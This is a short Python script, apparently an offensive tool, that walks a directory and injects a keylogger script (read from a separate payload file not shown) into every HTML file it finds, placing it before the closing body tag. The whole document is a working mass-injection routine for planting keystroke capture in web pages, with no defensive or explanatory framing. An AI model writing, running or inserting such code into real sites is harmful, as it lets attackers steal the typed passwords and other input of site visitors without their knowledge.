import os

def inject_keylogger(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".html"):
                full_path = os.path.join(root, file)
                with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                # Read the keylogger script
                with open("payloads/keylogger.js", "r", encoding="utf-8") as p:
                    keylogger_code = p.read()
                script_tag = f"<script>\n{keylogger_code}\n</script>\n"
                # Inject before </body>
                if "</body>" in content:
                    content = content.replace("</body>", script_tag + "</body>")
                else:
                    content += script_tag
                with open(full_path, "w", encoding="utf-8", errors="ignore") as f:
                    f.write(content)

